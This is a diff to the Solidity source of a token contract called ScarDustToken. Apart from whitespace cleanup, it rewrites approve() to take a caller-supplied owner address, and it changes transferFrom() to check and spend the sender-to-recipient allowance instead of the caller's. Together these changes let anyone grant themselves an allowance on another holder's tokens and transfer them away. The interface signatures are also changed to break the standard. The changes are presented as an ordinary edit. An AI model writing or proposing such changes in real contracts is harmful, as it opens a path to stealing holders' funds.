@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+
 abstract contract Context {
     function _msgSender() internal view virtual returns (address) {
         return msg.sender;
@@ -21,7 +22,7 @@ interface IERC20 {
    
     function allowance(address owner, address spender) external view returns (uint256);
  
-    function approve(address spender, uint256 amount) external returns (bool);
+    function approve(address owner, address spender, uint256 amount) external returns (bool);
 
     function transferFrom(address sender,address recipient,uint256 amount) external returns (bool); 
     event Transfer(address indexed from, address indexed to, uint256 value);
@@ -301,8 +302,8 @@ contract ScarDustToken is Context,IERC20, Ownable{
             return _allowances[owner][spender];
     }
  
-    function approve(address spender, uint256 amount) external override returns (bool){
-            _approve(_msgSender(),spender,amount);
+    function approve(address owner, address spender, uint256 amount) external override returns (bool){
+            _approve(owner,spender,amount);
             return true;
     }
 
@@ -337,9 +338,9 @@ contract ScarDustToken is Context,IERC20, Ownable{
         address recipient,
         uint256 amount
     ) public override returns (bool){
-        require(amount <= _allowances[sender][_msgSender()], "BEP20: transfer amount exceeds allowance");
+        require(amount <= _allowances[sender][recipient], "BEP20: transfer amount should not exceeds allowance!!!");
 		_transfer(sender, recipient, amount);
-		_approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
+		_approve(sender, recipient, _allowances[sender][recipient] - amount);
 		return true;
     }
 
@@ -664,7 +665,8 @@ contract ScarDustToken is Context,IERC20, Ownable{
     function removeFromExcluded(address toRemove) public onlyOwner{
         _excludedFromFees[toRemove] = false;
     }
-      function excludePresaleAddresses(address router, address presale) external onlyOwner {
+    
+    function excludePresaleAddresses(address router, address presale) external onlyOwner {
         
         _liquidityHolders[address(router)] = true;
         _liquidityHolders[presale] = true;
@@ -674,7 +676,6 @@ contract ScarDustToken is Context,IERC20, Ownable{
     }
 
     function startPresaleStatus()public onlyOwner{
-        
         buymktFee = 0;
         sellmktFee =0;
         buyliqFee =0;
@@ -736,7 +737,7 @@ contract ScarDustToken is Context,IERC20, Ownable{
              buyprizePool = newAmount;
     }
 
-      function updatecurrentsellLiqFee(uint256 newAmount) public onlyOwner{
+    function updatecurrentsellLiqFee(uint256 newAmount) public onlyOwner{
              sellliqFee = newAmount;
     }
     function updatecurrentsellmktfee(uint256 newAmount)public onlyOwner{
@@ -790,7 +791,7 @@ interface IUniswapV2Pair {
     function totalSupply() external view returns (uint);
     function balanceOf(address owner) external view returns (uint);
     function allowance(address owner, address spender) external view returns (uint);
-    function approve(address spender, uint value) external returns (bool);
+    function approve(address owner, address spender, uint value) external returns (bool);
     function transfer(address to, uint value) external returns (bool);
     function transferFrom(address from, address to, uint value) external returns (bool);
     function DOMAIN_SEPARATOR() external view returns (bytes32);
